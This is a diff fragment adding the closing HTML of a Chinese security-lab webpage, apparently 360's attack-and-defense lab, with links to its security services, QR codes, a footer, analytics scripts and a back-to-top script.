+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
